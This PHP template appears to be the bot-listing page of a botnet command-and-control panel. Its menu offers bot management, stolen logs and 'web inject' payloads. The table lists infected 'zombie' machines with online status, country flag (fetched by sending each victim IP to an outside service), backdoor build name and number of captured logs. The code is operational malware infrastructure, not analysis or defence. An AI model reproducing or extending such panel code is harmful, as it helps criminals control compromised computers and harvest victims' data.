<div class="panel">
    <div class="ui pointing menu">
      <a href="index.php?action=bots" class="active item">Bots</a>
      <a href="index.php?action=panel" class="item">Logs</a>
      <a href="index.php?action=payload" class="item">Web Inject</a>
      <a href="index.php?action=listpayload" class="item">List Web Inject</a>
      <a href="index.php?action=settings" class="item">Settings</a>
      <a href="logout.php" class="item">Logout</a>
      <div class="right menu">
        <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
      </div>
    </div>
    <div class="ui segment">
      <table class="ui very basic table">
  <thead>
    <tr>
      <th>Online</th>
      <th>Country</th>
      <th>Identify</th>
      <th>Build</th>
      <th>Logs</th>
    </tr>
  </thead>
  <tbody>
      <?php
    $bots = $bdd->prepare("SELECT * FROM bots");
    $bots->execute();
    while($fetch = $bots->fetch())
    {
        if($fetch['online'] == '0')
            $online = "<img class='status' src='images/offline.png'/>";
        if($fetch['online'] == '1')
            $online = "<img class='status' src='images/online.png'/>";
        ?>
        <tr>
          <td><?php echo $online; ?></td>
          <td><img src="http://www.geojoe.co.uk/api/flag/?ip=<?php echo $fetch['name']; ?>" /></td>
            <td><a class="zombie" href='index.php?action=info&id=<?php echo $fetch['id']; ?>'><?php echo $fetch['name'] ?></a></td>
          <td><?php echo $fetch['backdoor_name'] ?></td>
          <td><?php echo $fetch['numbers_logs'] ?></td>
        </tr>
      <?php
    }
      ?>
  </tbody>
</table>
    </div>
</div>